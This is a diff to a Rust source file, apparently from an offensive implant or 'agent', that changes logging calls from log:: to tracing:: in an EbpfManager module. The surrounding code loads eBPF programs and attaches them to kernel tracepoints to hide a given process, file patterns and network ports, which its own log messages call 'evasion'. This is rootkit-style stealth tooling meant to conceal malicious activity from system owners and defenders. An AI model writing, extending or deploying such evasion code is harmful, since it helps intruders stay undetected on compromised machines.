@@ -426,18 +426,18 @@ impl EbpfManager {
 
         // ── Process hiding ──────────────────────────────────────────────
         if let Err(e) = mgr.load_hide_process(pid) {
-            log::warn!("ebpf: process hiding load failed (non-fatal): {e:#}");
+            tracing::warn!("ebpf: process hiding load failed (non-fatal): {e:#}");
             return Ok(Self::new());
         }
 
         // ── File hiding ─────────────────────────────────────────────────
         if let Err(e) = mgr.load_hide_files(file_patterns) {
-            log::warn!("ebpf: file hiding load failed (non-fatal): {e:#}");
+            tracing::warn!("ebpf: file hiding load failed (non-fatal): {e:#}");
         }
 
         // ── Network hiding ──────────────────────────────────────────────
         if let Err(e) = mgr.load_hide_network(ports) {
-            log::warn!("ebpf: network hiding load failed (non-fatal): {e:#}");
+            tracing::warn!("ebpf: network hiding load failed (non-fatal): {e:#}");
         }
 
         Ok(mgr)
@@ -449,7 +449,7 @@ impl EbpfManager {
     /// partial failure (graceful degradation).
     pub fn attach_all(&mut self) -> Result<()> {
         if self.prog_fds.is_empty() {
-            log::warn!("ebpf: no programs loaded, skipping attach");
+            tracing::warn!("ebpf: no programs loaded, skipping attach");
             return Ok(());
         }
 
@@ -472,7 +472,7 @@ impl EbpfManager {
         let mut tp_idx = 0;
         for &prog_fd in &self.prog_fds {
             if tp_idx >= tracepoints.len() {
-                log::warn!("ebpf: more programs than tracepoint slots");
+                tracing::warn!("ebpf: more programs than tracepoint slots");
                 break;
             }
 
@@ -484,7 +484,7 @@ impl EbpfManager {
                     self.perf_fds.push(perf_fd);
                 }
                 Err(e) => {
-                    log::warn!(
+                    tracing::warn!(
                         "ebpf: failed to attach program fd {} to {}:{} (non-fatal): {e:#}",
                         prog_fd,
                         cat,
@@ -496,7 +496,7 @@ impl EbpfManager {
 
         if !self.perf_fds.is_empty() {
             self.active = true;
-            log::info!(
+            tracing::info!(
                 "ebpf: evasion active ({} programs attached)",
                 self.perf_fds.len()
             );
@@ -537,7 +537,7 @@ impl EbpfManager {
         self.prog_fds.clear();
         self.map_fds.clear();
         self.active = false;
-        log::debug!("ebpf: all programs detached and cleaned up");
+        tracing::debug!("ebpf: all programs detached and cleaned up");
     }
 
     // ── Internal loading methods ──────────────────────────────────────────
@@ -678,7 +678,7 @@ impl EbpfManager {
             let sz = *size as usize;
 
             if off + sz > obj.raw.len() {
-                log::warn!(
+                tracing::warn!(
                     "ebpf: program section '{}' extends past ELF end, skipping",
                     section_name
                 );
@@ -705,7 +705,7 @@ impl EbpfManager {
 
             match bpf_syscall(BPF_PROG_LOAD, &attr, std::mem::size_of::<BpfProgLoad>()) {
                 Ok(fd) => {
-                    log::debug!(
+                    tracing::debug!(
                         "ebpf: loaded program from section '{}' ({} insns) → fd {}",
                         section_name,
                         insn_cnt,
@@ -714,7 +714,7 @@ impl EbpfManager {
                     self.prog_fds.push(fd as RawFd);
                 }
                 Err(e) => {
-                    log::warn!(
+                    tracing::warn!(
                         "ebpf: failed to load program from section '{}': {e:#}",
                         section_name
                     );
@@ -759,7 +759,7 @@ impl EbpfManager {
             );
         }
 
-        log::debug!(
+        tracing::debug!(
             "ebpf: attached program fd {} to tracepoint {}:{} (perf_fd {})",
             prog_fd,
             category,
@@ -815,24 +815,24 @@ fn get_ebpf_bytes(program_name: &str) -> Result<Vec<u8>> {
 /// On failure, logs a warning and returns an inactive manager (graceful
 /// degradation — the agent continues without eBPF evasion).
 pub fn init(pid: u32, file_patterns: &[&str], ports: &[u16]) -> EbpfManager {
-    log::info!("ebpf: initializing evasion (pid={}, {} patterns, {} ports)", pid, file_patterns.len(), ports.len());
+    tracing::info!("ebpf: initializing evasion (pid={}, {} patterns, {} ports)", pid, file_patterns.len(), ports.len());
 
     let mut mgr = match EbpfManager::load_all(pid, file_patterns, ports) {
         Ok(m) => m,
         Err(e) => {
-            log::warn!("ebpf: load failed (non-fatal): {e:#}");
+            tracing::warn!("ebpf: load failed (non-fatal): {e:#}");
             return EbpfManager::new();
         }
     };
 
     if let Err(e) = mgr.attach_all() {
-        log::warn!("ebpf: attach failed (non-fatal): {e:#}");
+        tracing::warn!("ebpf: attach failed (non-fatal): {e:#}");
     }
 
     if mgr.is_active() {
-        log::info!("ebpf: evasion successfully initialized");
+        tracing::info!("ebpf: evasion successfully initialized");
     } else {
-        log::warn!("ebpf: evasion not active (likely insufficient privileges)");
+        tracing::warn!("ebpf: evasion not active (likely insufficient privileges)");
     }
 
     mgr
